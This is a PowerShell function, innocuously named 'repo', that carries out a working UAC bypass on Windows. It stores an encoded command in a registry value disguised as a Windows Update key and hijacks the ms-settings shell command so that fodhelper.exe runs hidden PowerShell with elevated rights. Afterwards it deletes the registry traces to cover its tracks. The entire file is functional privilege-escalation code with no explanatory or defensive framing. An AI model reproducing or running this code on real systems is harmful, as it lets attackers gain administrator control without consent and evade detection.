function repo {

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
    Param (
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Command,

        [Switch]
        $Force
    )
    $CP = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
    $SDP = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

    if($CP -Eq 2 -And $SDP -Eq 1){
        exit
    }
    else{

        $RP = 'HKCU:Software\Microsoft\Windows\Update'
        $parts = $RP.split('\');
        $path = $RP.split("\")[0..($parts.count -2)] -join '\';
        $name = $parts[-1];
        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $Command;

        $mssCP = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

        $LC = $pshome + '\' + 'powershell.exe -NoP -NonI -W H -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -NoP -NonI -W H -e $x'

        if ($Force -or ((Get-ItemProperty -Path $mssCP -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
            New-Item $mssCP -Force | Out-Null
            New-ItemProperty -Path $mssCP -Name "DelegateExecute" -Value "" -Force | Out-Null
            Set-ItemProperty -Path $mssCP -Name "(default)" -Value $LC -Force | Out-Null
        }else{
            Write-Warning "Key already exists, use -Force"
            exit
        }

        $FHP = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'fodhelper.exe'

        if ($PSCmdlet.ShouldProcess($FHP, 'Start process')) {
            $Process = Start-Process -FilePath $FHP -PassThru -WindowStyle Hidden
        }

        if (-not $PSBoundParameters['WhatIf']) {
            Start-Sleep -Seconds 5
        }

        $mssFP = 'HKCU:\Software\Classes\ms-settings\'
        $PP = 'HKCU:Software\Microsoft\Windows'
        $PK = "Update"

        if (Test-Path $mssFP) {

            Remove-Item $mssFP -Recurse -Force
            Remove-ItemProperty -Force -Path $PP -Name $PK
        }

        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
            Stop-Process -Id $Process.Id
        }
    }
}
